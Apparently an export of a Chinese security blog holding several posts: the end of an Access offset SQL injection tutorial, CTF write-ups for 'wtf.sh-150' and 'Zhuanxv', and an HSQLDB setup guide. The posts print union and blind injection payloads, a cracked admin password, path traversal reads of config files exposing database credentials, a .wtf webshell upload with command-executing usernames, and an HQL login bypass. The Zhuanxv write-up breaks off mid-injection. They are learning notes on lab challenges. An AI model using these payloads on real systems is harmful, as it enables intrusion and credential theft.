根据页面返回的数据，我们可以看到，在第13号显示位我们成功的爆出了admin字段的第一个值:admin 原因： 我们先观察sql语句，发现union关键字后面的select查询的填充字段多了代码“b.id”，意思是在此输出b表（admin表的别名之一）的id字段值，由于此处已经显式的指出id字段值的输出位置，那么后面的 “ * ” 就会自动的识别，就只输出admin自联表剩下的字段值了，从而使得剩余数据均向后移动了一个字段，让原本在13号字段的admin字段向后移动了1位，到了13号显示位上了。 但请注意：此处的id字段名是我们已经猜解出的 这也就回答了上述所说的：“向后移动的字段数仍然取决于：我们能够猜解出admin表中多少个字段名，不过这里所需要猜解的字段名不需要必须是我们想要查找的字段名，只要是admin表中的字段名均可”。因此，如果我们想让admin数据向后移动2个字段值，那么我们就需要知道除了id字段名外，其他任一字段名即可，然后构造如下payload：?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,b.id,b.字段名 * from (admin a inner join admin b on a.id=b.id) 附上图片： 0x05 总结 这里依旧cv了一下那篇参考文章(┭┮﹏┭┮太菜了,没自己的想法) 至此，整个测试已结束，我们成功的爆出了 账号与密码：admin/a48e190faf 接下来我会依次提出几个问题，然后一一进行解答： 如果我们仍然采用上述环境，那可不可以进行3级偏移和四级偏移呢？ 答：3级偏移可以，但是4级偏移不行，因为如果进行4级偏移的话，就会使得偏移注入基本公式：联合查询补充字段数=当前字段数量-目标表的字段数 x 4 ==&gt; 22-6x4=-2&lt;0，即：会造成union关键字之前的select查询字段数的数量 &lt; union关键字之后的字段数量，从而导致查询失败。 3级偏移的payload：?id=1513 union select top 1 1,2,3,4, * from((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id) access偏移注入是否是真的随机？ 通过上述原理的讲解，这个问题也就不攻自破了，显然access注入并不是真正的随机，并不是完全不受我们控制的，在我们获取足够信息的情况下（“目标表”的字段数量，当前字段数量，已知的“目标表字段名\"的数量），我们可以在一定范围内完全控制显示位处的数据显示，而之所以说是一定范围内，只是因为 “显示位的位置” 和 “我们可以猜解到的目标表字段名的数量” 这两个因素不是我们可以控制的。 是否可以只说：“当前表”的字段数越多成功率越大，或“目标表”的字段数越少成功率越大？ 显然我们不能这样简单的得出结论，偏移注入是否能够成功，取决于：“显示位位置” 和 “目标字段能够移动到的位置” 是否可以重合，如果可以重合的话，即使“当前表”字段数小一点，“目标表”字段数多一点也是无妨的（但万万不可“当前表”的字段数量 &lt; “目标表”的字段数量） 是什么决定着“目标表”的数据一次性前移的字段数？是什么决定着“目标表”的数据可以后移的字段数？ 前者是由 “目标表的字段数量” 所决定的：目标表中的数据 向前移动的字段数 只能是 目标表中的字段数的整数倍（这是由表自连接的特性所决定的）。 后者是由 “我们可以猜解得到的目标表的字段名数量” 所决定。若猜解出1个字段名，那么我们就可以让数据向后移动1个字段数，若猜解出2个字段名，那么我们就可以让数据向后移动2个字段数，以此类推。（不过这里所需要猜解的字段名不需要必须是我们想要查找的字段名，只要是admin表中的字段名均可） 可以看到上述的三级偏移是进行了两次笛卡尔积的操作 不得不说这个偏移注入真的厉害，真有一种黑客的感觉 这里顺便总结比较一下联合注入和逐字猜解语句 5.1 联合注入 先是判断是否存在注入，这里就不赘述了 5.1.1 判断字段数 ?id=1513 order by 22 #页面正常 ?id=1513 order by 23 #页面报错 说明当前表的字段数为16 5.1.2 爆出回显位 ?id=1513 union select 字段数 from 正确表名 随机查看页面或者源代码看那些字段是可以回显的 5.1.3 猜测表名 ?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin ——猜表名（报错说明表名不存在，将admin换成别的继续猜） 5.1.4 猜测列名 ?id=1513 union select 1,2,username,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin ——猜列名（列名位置放置页面上显示的数字位置上）（报错说明列名不存在，换列明继续猜）（列名猜对后及出账号密码） 5.2 逐字猜解法 先是判断是否存在注入，也不赘述 5.2.1 猜测表名 ?id=1513 and exists (select * from admin) ——猜表名 页面正常即猜测正确 5.2.2 猜测列名 ?id=1513 and exists (select user_name from admin) ——猜列名 页面正常即猜测正确 5.2.3 爆数据 1.确定长度 2.确定asc数据(asc编码) ?id=1513 and (select top 1 len(user_name ) from admin)=5(user_name 的长度=5，正常则=5，也可以用&gt;,&lt;号去判断） ?id=1513 and (select top 1 asc(mid(user_name ,1,1)) from admin)=97 判断第一位（97代表‘a’的ascll值） ?id=1513 and (select top 1 asc(mid(user_name ,2,1)) from admin)=97 判断第二位 （user_name =admin 第一位a 第二位d 第三位m 第四位i 第五位n pass_word=a48e190fafc257d3） 更多骚操作就不赘述了，日后碰到的话在找，这里主要就是了解数据库的特性以及常规语句。 现在存在Access数据库的网站越来越少了，一般都是一些小型站或是老站，相对来说参考价值较低。而随着新型数据库的兴起，慢慢地Access数据库也会卷入时代的浪潮里而消失。但怎样有效地防范SQL注入、提升网络安全意识却是个长久的议题。 0x06 参考文章 [access偏移注入原理] SQL注入系列之ASP+ACCESS手动注入(一)----数字型 SQL注入之Access数据库","categories":["常见top漏洞"]},{"title":"wtf.sh-150","path":"/2023/10/05/wtf.sh-150/","content":"题目描述 无 题目解题 访问首页后如下图 发现找不出什么信息，于是dirsearch扫了也没什么发现，只有个url/css，访问之后似乎没有效果 之后看到首页有登录，注册功能，尝试一下弱口令先 测试了几个没有成功，不过确定的是存在管理员账户admin，那肯定是要找到其密码登录的（这里我也尝试了爆破，无果）。那我们只能注册看看了 注册之后随便点了几个链接，发现url参数一直在变，那这里肯定是有东西的（但我不知道如何搞。。）之后我对比了两次抓包登录框的信息 发现这里是有cookie存在的，那猜测应该是构造admin的cookie 这里没思路后看了两眼wp说是目录穿越。。。┭┮﹏┭┮太菜了根本不往这里想，那我们先尝试一下 这里真尴尬，我目录穿多了，页面一直刷新不过来，看了wp发现尝试一个就可以了，看来以后测试的时候我也应该从一个开始，不然就忽略某些信息了 这里向下翻发现源码 这里虽然发现可疑处，但我不知如何利用，只得在看一眼wp0.o 大佬们说的是从这些源码中可以分析出这个admin账户应该是可以使用cookie登录的。 并且源码中有一些敏感信息，比如users 于是他们便开始这样操作：使用目录穿越查看users信息 可以看到出现疑似md5字符串以及base64编码的字符串，这里我找了一下我注册的user信息 发现下面一行与我cookie的token所对应，那我猜测上面的md5或许是如下图所示的加密结果 随后尝试md5解密，没想到竟然可以解出来 发现是16进制字符串，那我们再解密一下 如图发现与我创建的账号密码是相同的，那我们直接去解密一下admin的信息看看，但可恶的是我解密不出来┭┮﹏┭┮，不过看了wp我才发现我有多蠢。记得登录的时候只需要用户名和token就行了。。。。。真尴尬啊 我们直接改一手username和token，不过失败了，在看wp发现是方法有问题。我们先正确操作一下 直接访问首页，抓包首页即可，不要在登录时抓包，如下图所示，之后添加admin的cookie即可 添加之后直接放包就可以看到我们成功以admin身份登录 我猜测这里不在登录时抓包的原因是，服务器会检查你登录时的账号密码，他并不以检查cookie为主，如果你账号密码不对，即使cookie是admin的也无法正确登录。而直接在首页抓包添加cookie就避开了对账号密码的检测。–这也提供了一些奇怪的姿势 之后wp说：之后点击上图中的Profile，继续抓包，用admin账号查看相关的内容，如果不抓包添加cookie，就查看不到前半段flag。 这里我就恍然了，我们看下图 这里说如果cookie的username什么什么的等于admin才可以得到flag。 不过这里抓包后仍然需要添加cookie才能行，这里就是思路的沿用，因为上述也是只凭借cookie去登录，但登陆之后你会发现系统还是提示你：你不是admin身份。故此我们在进行操作就应该添加代表admin的cookie才能躲过检测吧。。。 这里添加了cookie一直放包，然后看到页面回显了一部分flag：Flag: xctf{cb49256d1ab48803 这里也就对应了上述的源码了。之后就是我看不懂的操作了，只能含泪看wp-.- 这里便是有趣的代码审计了┭┮﹏┭┮。 这里找到这行代码的思路是，题目一直提示我们WTF这个关键词，因此wp就搜索WTF找到了如下代码 ​ wtf文件其实是用户自己定义的一种文件格式，他的处理其实每一行进行php代码逻辑的处理，由于调用了eval思路一下子就清晰了，对.wtf每一行都进行了eval操作，结合注释我们可以看到，每一行必须以$开头 max_page_include_depth=64 #用于限制包含的深度，最大为64。 page_include_depth=0 #跟踪当前包含的深度，初始化为0。 function include_page { # include_page pathname local pathname=$1 #用于存储传递给函数的文件路径。 local cmd= #用于构建要执行的Shell命令。 [[ ${pathname(-4)} = '.wtf' ]];#判断文件的扩展名是否为 \".wtf\"如果是，会将 can_execute 设置为 1，表示可以执行命令。 local can_execute=$;\t#用于标记是否可以执行命令。 page_include_depth=$(($page_include_depth+1)) if [[ $page_include_depth -lt $max_page_include_depth ]] #如果 page_include_depth 小于 max_page_include_depth，则进入条件分支，表示可以继续包含文件。 then local line; while read -r line; do\t#逐行读取被包含的文件 # check if we're in a script line or not ($ at the beginning implies script line) # also, our extension needs to be .wtf #对于每一行，首先检查是否包含脚本。如果 $ 符号出现在行的开头并且 can_execute 为0，则表示当前行是脚本。 [[ $ = ${line01} &amp;&amp; ${can_execute} = 0 ]]; is_script=$;\t#用于标记当前行是否包含脚本。 # execute the line. #如果当前行不是脚本（$is_script 为0），则将该行添加到 cmd 变量中，以便构建要执行的命令。 if [[ $is_script = 0 ]] then cmd+=$'n'${line#$}; else #如果当前行是脚本，那么检查 cmd 是否包含内容，如果包含，则执行 cmd 中的命令，并记录错误日志。 if [[ -n $cmd ]] then eval $cmd log Error during execution of ${cmd}; cmd= fi #如果当前行不是脚本，直接输出该行内容。 echo $line fi done ${pathname} else echo pMax include depth exceeded!p fi } 由于代码审计太菜了，就跟着GPT学习吧。。。 下面是一些符号的解释 1. 在这段代码中，-lt 是一个比较运算符，用于比较两个数值，它代表 \"less than\"（小于）的意思。具体来说，-lt 用于比较左边的数值是否小于右边的数值。 2. -n 是一个条件测试，在这里的上下文中，它用于检查一个变量 $cmd 是否包含非空值。具体地说，-n 用于判断一个字符串是否为空。 3. 在这行代码中，$1 表示函数 include_page 的第一个参数，也就是在调用该函数时传递给它的第一个值。在Shell脚本中，函数可以接受多个参数，这些参数可以通过$1、$2、$3 等来访问，分别代表第一个、第二个、第三个参数，依此类推。 能够解析并执行wtf文件，如果还能够上传wtf文件并执行的话，就可以达到控制服务器的目的。 function reply { local post_id=$1; local username=$2; local text=$3; local hashed=$(hash_username \"${username}\"); #遍历名为 posts/${post_id}/ 的目录中的所有文件和子目录。使用 basename 命令提取每个文件和子目录的名称。 #对这些名称进行数值排序（sort -n）。从排序后的列表中选择最后一个（tail -n 1），这将是当前最后一个回复的ID。 curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1); #计算下一个回复的ID（next_reply_id），它是当前最后一个回复的ID加1。 next_reply_id=$(awk '{print $1+1}' &lt;&lt;&lt; \"${curr_id}\"); #创建一个新的回复文件的路径（next_file），该路径由 posts/${post_id}/${next_reply_id} 构成。 next_file=(posts/${post_id}/${next_reply_id}); #在新的回复文件中写入以下内容： #回复的用户名（${username}）,回复的主题（通过调用 nth_line 2 从第一个回复文件中获取）,回复的文本内容（${text}） echo \"${username}\" &gt; \"${next_file}\"; echo \"RE: $(nth_line 2 &lt;; \"posts/${post_id}/1\")\" &gt;&gt; \"${next_file}\"; echo \"${text}\" &gt;&gt; \"${next_file}\"; # add post this is in reply to to posts cache #最后，将新回复的信息添加到回复用户的帖子缓存中，这是通过将信息追加到 users_lookup/${hashed}/posts 文件来实现的。这将允许用户轻松查找他们所回复的帖子。 echo \"${post_id}/${next_reply_id}\" &gt;&gt; \"users_lookup/${hashed}/posts\"; } 这是评论功能的后台代码，这部分也是存在路径穿越的。 这行代码把用户名写在了评论文件的内容中： echo \"${username}\" &gt; \"${next_file}\"; 通过上面的分析：如果用户名是一段可执行代码，而且写入的文件是 wtf 格式的，那么这个文件就能够执行我们想要的代码。 （而且wtf.sh只运行文件扩展名为.wtf的脚本和前缀为’$'的行） ​ 我们可以利用的是text和username，然后用户名和text最后会被保存到posts/${post_id}/${next_reply_id}路径下 如果我们能够手动构造路径，使得最后文件路径后缀是.wtf的话，他就会解析为.wtf文件，执行eval函数，那么照着这个思路，开始利用 单看这段代码，username和text好像都能利用，但是text不执行系统命令，只输出文本，可能在其他地方做了过滤，那么只能利用username 先看看username在哪，构造用户名${find,/,-iname,get_flag2}//空格被过滤了，{,}是bash绕过空格过滤的方法之一 $/usr/bin/get_flag2得到flag 先普通地评论一下，知晓评论发送的数据包的结构，在普通评论的基础上，进行路径穿越 修改路径去上传 上传后门sh.wtf，wtf后面要加%09,表示制表符,否在会被当做目录去解析，不过这里直接…/hm.wtf%09也可，这里是wp添加了一个url大概是为了方便吧 如图这里应该就是成功上传了 然后我们去注册用户，用户名就是我们查找get_flag2的命令，以这个用户名去评论然后上传到之前后门的路径。 第一条首先查找get_flag2${find,/,-iname,get_flag2} 这里前面加个$是wtf文件执行命令的写法 注册成功后去评论功能抓包 之后访问路径看看 成功执行，得到flag2的路径，之后继续凭此路径当做用户名去注册，并上传至ht.wtf后门 $/usr/bin/get_flag2 拿到flag xctf{cb49256d1ab48803149e5ec49d3c29ca} 参考文章 攻防世界 WEB wtf.sh-150 攻防世界XCTF：wtf.sh-150 【愚公系列】2023年06月 攻防世界-Web（wtf.sh-150） 攻防世界 web进阶区 wtf.sh-150","tags":["攻防世界"],"categories":["攻防世界"]},{"title":"初识HSQL","path":"/2023/10/03/chu-shi-hsql/","content":"0x01 前言 本文主要是在一次做攻防世界中的题时，所遇到的不懂的点，故此学习一番记录一下。这里并不会讲太深，emmm，因为我感觉不必太深只是懂了各种增删改查的语句我认为即可。话不都说开始卷！ 0x02 Hsql 2.1 HSQLDB 介绍 HyperSQL 数据库 (HSQLDB) 是一种现代关系数据库管理器，它紧密符合 SQL:2011 标准和 JDBC 4 规范。它支持所有核心功能和 RDBMS。HSQLDB 用于开发、测试和部署数据库应用程序。 HSQLDB 的主要和独特功能是标准合规性。它可以在用户的应用程序进程内、应用程序服务器内或作为单独的服务器进程提供数据库访问。 2.2 HSQLDB 特点 HSQLDB 使用内存结构对数据库服务器进行快速操作。它根据用户的灵活性使用磁盘持久性，并具有可靠的崩溃恢复。 HSQLDB 也适用于商业智能、ETL 和其他处理大型数据集的应用程序。 HSQLDB 具有广泛的企业部署选项，例如 XA 事务、连接池数据源和远程身份验证。 HSQLDB 是用 Java 编程语言编写的，并在 Java 虚拟机 (JVM) 中运行。它支持用于数据库访问的 JDBC 接口。 2.3 HSQLDB 组成部分 HSQLDB jar 包中有三个不同的组件。 HyperSQL RDBMS 引擎 (HSQLDB) HyperSQL JDBC 驱动程序 数据库管理器（GUI 数据库访问工具，具有 Swing 和 AWT 版本） HyperSQL RDBMS 和 JDBC 驱动程序提供核心功能。数据库管理器是通用数据库访问工具，可与任何具有 JDBC 驱动程序的数据库引擎一起使用。 另一个名为 sqltool.jar 的 jar 包含 Sql Tool，它是一个命令行数据库访问工具。这是一个通用命令。Line 数据库访问工具，也可以与其他数据库引擎一起使用。 0x03 HSQLDB 安装 HSQLDB 是一个用纯 Java 实现的关系数据库管理系统。您可以使用 JDBC 轻松地将此数据库嵌入到您的应用程序中。或者您可以单独使用这些操作。 3.1 先决条件 遵循 HSQLDB 的必备软件安装。 3.2 验证 Java 安装 由于HSQLDB是纯Java实现的关系型数据库管理系统，所以在安装HSQLDB之前必须先安装JDK（Java Development Kit）软件。如果您的系统中已经安装了 JDK，请尝试以下命令来验证 Java 版本。 java –version 如果您的系统中成功安装了 JDK，您将获得以下输出。 java version \"1.8.0_91\" Java(TM) SE Runtime Environment (build 1.8.0_91-b14) Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode) 如果您的系统中没有安装 JDK，请访问以下链接以安装 JDK。 3.3 HSQLDB 安装 以下是安装 HSQLDB 的步骤。 步骤 1 – 下载 HSQLDB 包 从以下链接https://sourceforge.net/projects/hsqldb/files/下载最新版本的 HSQLDB 数据库 3.4 准备驱动 步骤 2 – 解压缩 HSQLDB zip 文件 解压缩 zip 文件并将其放入C:\\目录（任意目录均可） 这里也是废了我很长时间，试验下来似乎只有2.3.4版本的稳定，其他版本的不知道如何启动，而且也没有近几年关于此hsqldb的介绍文章了。难受 步骤 3 – 创建默认数据库 1、 在d盘下建立一个目录hsqldb文件夹（这个是任意建立的），在文件夹中创建lib文件夹，将hsqldb-2.3.4解压后的lib目录下的hsqldb.jar拷贝到里面，然后在hsqldb文件夹中创建一个data的文件夹。 3.5 启动服务 2、 创建数据库 进入命令提示符，进入data文件夹，输入下面的命令： java -cp ../lib/hsqldb.jar org.hsqldb.Server -database test 成功开启 3、 在data文件夹中就会出现两个文件：test.log和 test.properties，也就是创建了一个名称为test的数据库，如下图所示。 这里一直到启动数据库那里都存在问题，我不清楚该数据库的别名是啥了。。。解决的话看后面（跳过这里） 4、 然后在hsqldb的文件夹中创建一个mydb文件夹，在文件夹中创建三个文件：runManager.bat，runManagerSwing.bat和runServer2.bat runManager.bat对应的内容为： cd ..\\data @java -classpath ..\\lib\\hsqldb.jar org.hsqldb.util.DatabaseManager runManagerSwing.bat对应的内容为： cd ..\\data @java -classpath ..\\lib\\hsqldb.jar org.hsqldb.util.DatabaseManagerSwing runServer2.bat对应的内容为： cd ..\\data @java -classpath ../lib/hsqldb.jar org.hsqldb.server.Server -port 9001 -database.0 file:../data/mydb -dbname.0 mydb 5、 运行hsqldb 双击runServer2.bat文件，此时回弹出命令行窗口，如下图，表示已启动 HSQLDB 数据库。 这里弹一下就没了，我截不住图。。。。 此时，产生了三个文件，如： test.lck ——标识数据库锁状态。 test.log ——运行数据库产生的log信息，它将记录每一个运行和用户操作环节。 test.properties——数据库的配置信息，包括分配的内存大小等，可更具需要修改。 3.6 运行模式 数据库引擎分4种工作模式：内存In-Memory、独立Standalone、服务器Server、韦伯服务器WebServer，启动方式参数大同小异，本文以第三种为例； 4. 管理HSQL 启动HSQL管理工具，打开命令行窗口，执行下列命令： java -cp hsqldb.jar org.hsqldb.util.DatabaseManager 出现connect窗口： 不过这里直接双击运行runManager.bat即可 Recent：将会列出最近的数据库配置 Setting Name: 设置名称，这里不需要填写 Type：选择服务器模式（HSQL Database Engine Server） Driver：驱动名称，不需要修改 URL：JDBC连接，无需修改 User：用户名,根据需要设置 Password：密码，根据需要设置 在命令行模式下启动HSQL服务器模式： java -cp ../lib/hsqldb.jar org.hsqldb.Server -database.0 db -dbname.0 db ​ 命令中的org.hsqldb.Server -database.0与-dbname.0为固定值，db 为数据库别名，如果该库存在，则打开该库，不存在，则新建并打开。 java -cp ../lib/hsqldb.jar org.hsqldb.util.DatabaseManager 上述命令会启动服务 选择引擎Type：HSQL Database Engine Server模式，修改URL：jdbc:hsqldb:hsql://localhost/db，db为步骤三中指定的数据库别名，用户名SA，密码为空，登录。 3.7 执行SQL 登录成功后，工作台如图所示，界面简单的像是Demo！左侧为数据库的所有表树图，右上侧为SQL编辑区： 输入SQL语句，点击右侧Execute执行 在这里大小写均可，不过还是推荐大写 获得HSQL语法帮助，点击菜单Command ——&gt; CREATE TABLE ： HSQL SELECT语法： HSQL环境变量： 3.7 关闭HSQL 在SQL编辑区输入shutdown命令，单击Execute执行： 服务器响应如下： 0x04 进一步熟悉 回顾之前做的ctf题目，其中一个sql语句是这样写的 public List&lt;User&gt; loginCheck(String name, String password) { return this.getHibernateTemplate().find(\"from User where name ='\" + name + \"' and password = '\" + password + \"'\"); } 而佬是这样绕过的： from User where name ='admin' or '1'&gt;'0' or name like 'admin' and password = '\" + password + \"' 这样的话他是这样传参的 用户名： admin' or '1'&gt;'0' or name like 'admin 这里呢，前面的第一个单引号是为了闭合where name='中的单引号 后面的用or隔开，接着是’1’ &gt; ‘0’，很明显恒为true，接着在or隔开name like 'admin，这里的单引号用来闭合name ='\" + name + \"'中的最后的单引号。由于1&gt;0为true，那么这整条语句就为true，也就不需要关心密码是多少了。 至于为何要1&gt;0而不用1=1，是因为题目过滤了等于号 至于为什么是要用两个or，是因为，mysql里and优先级比or高 那么两个or的作用是保证永真，简单举个例，一个or:admin’ or ‘1’&gt;‘0’ and password=1 表示为false or true and false，先执行true and false， 为false再有false or false那就是false，而两个false or true or true and false是true，因此根据这个逻辑，可以进行盲注 但不理解的是他们是如何知道数据库一定含有admin的用户的。。。可能是猜测一般root用户都是admin吧。。。 0x04 总结 总之这个HSQL与mysql很类似，HSQL数据库有如下两个特点： 一是“纯而精”，它是一款由HSQL Development Group开发的纯Java数据库，遵循BSD-style许可协议，支持SQL99，SQL2003大部分语法标准； 二是“小而轻”，更为重要的是，该数据库体积贼小，数据库引擎、JDBC驱动与管理工具三合一加起来才600多Kb，JBoss、Kettle3.0及以上、DataX 等大多数工具或中间件默认都支持HSQL。 参考文章 hsqldb的安装使用 HSQLDB教程 HSQL 数据库入门","tags":["基本知识"],"categories":["web知识总结"]},{"title":"Zhuanxv","path":"/2023/10/03/zhuanxv/","content":"题目描述 你只是在扫描目标端口的时候发现了一个开放的web服务 题目解题 打开首页如上图，查找一番没什么信息，直接扔给dirsearch扫一下，结果扫出来个list，添加到url后自动跳转到一个登录页面。 之后测试了几番XSS、sql注入，弱口令但没什么效果，随后就没思路了，之后网上漫游看到了一点思路，于是接着开始尝试，据他的思路进入这里也可以在抓包之后尝试forward放包看看有什么敏感信息，于是乎我放包看到如下 发现这里加载了图片，因为不是咱们上传的，那肯定是后端服务器加载的嘛。于是乎我们可以尝试在此url上读取一些敏感信息，也就是进行目录遍历，然后我又接着尝试读取，但页面虽然返回200，但还是没有信息。无奈再去看wp，发现是路径的错误，他是这样读取的： ?fileName=../../WEB-INF/web.xml 接着他解释了为何web.xml在此处：这是因为写web项目的时候有层级要求，一般效果如图： static目录一般放置资源等，图片、文本等，一般上上级的WEB-INF会放配置文件，如图： 随后我们访问一下发现如图，是一个下载的bg.jpg图片 这里也可以看到图片中含有struts2框架，但我也不熟悉，只能跟着wp走了。┭┮﹏┭┮ 可以看到，该项目使用的struts2框架（丫的老掉牙了），struts.xml是struts2的核心配置文件，该文件主要负责管理应用中的Action映射，以及该Action包含的Result定义等，因此我们需要读取struts.xml看看，构造payload： /loadimage?fileName=../../WEB-INF/classes/struts.xml 如图发现含有struct2-2.3.dtd，我这里猜测版本是2.3，应该可以利用爆出的漏洞poc来解 内容如下： &lt;?xml versinotallow=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\" \"http://struts.apache.org/dtds/struts-2.3.dtd\"&gt; &lt;struts&gt; &lt;constant name=\"strutsenableDynamicMethodInvocation\" value=\"false\"/&gt; &lt;constant name=\"struts.mapper.alwaysSelectFullNamespace\" value=\"true\" /&gt; &lt;constant name=\"struts.action.extension\" value=\",\"/&gt; &lt;package name=\"front\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;global-exception-mappings&gt; &lt;exception-mapping exception=\"java.lang.Exception\" result=\"error\"/&gt; &lt;/global-exception-mappings&gt; &lt;action name=\"zhuanxvlogin\" class=\"com.cuitctf.action.UserLoginAction\" method=\"execute\"&gt; &lt;result name=\"error\"&gt;/ctfpage/login.jsp&lt;/result&gt; &lt;result name=\"success\"&gt;/ctfpage/welcome.jsp&lt;/result&gt; &lt;/action&gt; &lt;action name=\"loadimage\" class=\"com.cuitctf.action.DownloadAction\"&gt; &lt;result name=\"success\" type=\"stream\"&gt; &lt;param name=\"contentType\"&gt;image/jpeg&lt;/param&gt; &lt;param name=\"contentDisposition\"&gt;attachment;filename=\"bg.jpg\"&lt;/param&gt; &lt;param name=\"inputName\"&gt;downloadFile&lt;/param&gt; &lt;/result&gt; &lt;result name=\"suffix_error\"&gt;/ctfpage/welcome.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;package name=\"back\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;interceptors&gt; &lt;interceptor name=\"oa\" class=\"com.cuitctf.util.UserOAuth\"/&gt; &lt;interceptor-stack name=\"userAuth\"&gt; &lt;interceptor-ref name=\"defaultStack\" /&gt; &lt;interceptor-ref name=\"oa\" /&gt; &lt;/interceptor-stack&gt; &lt;/interceptors&gt; &lt;action name=\"list\" class=\"com.cuitctf.action.AdminAction\" method=\"execute\"&gt; &lt;interceptor-ref name=\"userAuth\"&gt; &lt;param name=\"excludeMethods\"&gt; execute &lt;/param&gt; &lt;/interceptor-ref&gt; &lt;result name=\"login_error\"&gt;/ctfpage/login.jsp&lt;/result&gt; &lt;result name=\"list_error\"&gt;/ctfpage/welcome.jsp&lt;/result&gt; &lt;result name=\"success\"&gt;/ctfpage/welcome.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;/struts&gt; 可以看到有很多url地址，之后是wp的讲解： 可以看到有很多class，这就是所谓的映射文件，如表示访问loadimage路径时候，会去找字节码com.cuitctf.action.DownloadAction文件去加载内容，我们一一构造payload： loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/DownloadAction.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/AdminAction.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/UserOAuth.class 下载下来后请记得修改文件名称.class，进行反编译开始代码审计 上图是用idea打开进行反编译，看了一番发现userlogin文件比较可疑 如图发现存在ctf什么的包，那我们构造url访问一下看看 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/po/User.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/UserService.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/InitApplicationContext.class User.class反编译后是一个Bean文件，UserLoginAction.class反编译后是登录验证逻辑文件，InitApplicationContext.class反编译后是类加载器文件。 我们可以看到，加载应用的xml配置文件为applicationContext.xml，该文件一般是项目的启动配置文件，包括数据库等，同样构造payload，如下： loadimage?fileName=../../WEB-INF/classes/applicationContext.xml 下载后源码如下： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\"&gt; &lt;property name=\"driverClassName\"&gt; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt; &lt;/property&gt; &lt;property name=\"url\"&gt; &lt;value&gt;jdbc:mysql://localhost:3306/sctf&lt;/value&gt; &lt;/property&gt; &lt;property name=\"username\" value=\"root\"/&gt; //数据库账号密码 &lt;property name=\"password\" value=\"root\" /&gt; &lt;/bean&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate3.LocalSessionFactoryBean\"&gt; &lt;property name=\"dataSource\"&gt; &lt;ref bean=\"dataSource\"/&gt; &lt;/property&gt; &lt;property name=\"mappingLocations\"&gt; &lt;value&gt;user.hbm.xml&lt;/value&gt; &lt;/property&gt; &lt;property name=\"hibernateProperties\"&gt; &lt;props&gt; &lt;prop key=\"hibernate.dialect\"&gt;org.hibernate.dialect.MySQLDialect&lt;/prop&gt; &lt;prop key=\"hibernate.show_sql\"&gt;true&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"hibernateTemplate\" class=\"org.springframework.orm.hibernate3.HibernateTemplate\"&gt; &lt;property name=\"sessionFactory\"&gt; &lt;ref bean=\"sessionFactory\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"transactionManager\" class=\"org.springframework.orm.hibernate3.HibernateTransactionManager\"&gt; &lt;property name=\"sessionFactory\"&gt; &lt;ref bean=\"sessionFactory\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"service\" class=\"org.springframework.transaction.interceptor.TransactionProxyFactoryBean\" abstract=\"true\"&gt; &lt;property name=\"transactionManager\"&gt; &lt;ref bean=\"transactionManager\"/&gt; &lt;/property&gt; &lt;property name=\"transactionAttributes\"&gt; &lt;props&gt; &lt;prop key=\"add\"&gt;PROPAGATION_REQUIRED&lt;/prop&gt; &lt;prop key=\"find*\"&gt;PROPAGATION_REQUIRED,readOnly&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"userDAO\" class=\"com.cuitctf.dao.impl.UserDaoImpl\"&gt; &lt;property name=\"hibernateTemplate\"&gt; &lt;ref bean=\"hibernateTemplate\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"userService\" class=\"com.cuitctf.service.impl.UserServiceImpl\"&gt; &lt;property name=\"userDao\"&gt; &lt;ref bean=\"userDAO\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;/beans&gt; 其中暴露了使用的数据库，数据库账号密码，且其中包含了user.hbm.xml等配置文件，同样我们将其下载出来： loadimage?fileName=../../WEB-INF/classes/user.hbm.xml loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class 可以看到user.hbm.xml暗示了flag在数据库中位置，如图： 看到table表示表名，column表示列名 UserServiceImpl.class反编译后，是对登录信息进行了过滤，如图： UserDaoImpl.class反编译后，是对登录的sql查找，如图： 冥冥之中认为这似乎会联系到sql注入，但印象中java的sql注入很难，毕竟有jdbc的预编译 此处参考网上大佬的wp，上面图的sql语句使用HSQL，因此构造登录账号密码： from User where name ='admin' or '1'&gt;'0' or name like 'admin' and password = '\" + password + \"' UserServiceImpl.class反编译后代码中是对空格进行了过滤，而sql中对回车自动过滤， 因此我们可以将空格字符换成%0A（ascii码表示换行符）。于是使用hackbar进行翻译，得到新的注入sql的payload： admin'%0Aor%0A'1'&gt;'0'%0Aor%0Aname%0Alike%0A'admin 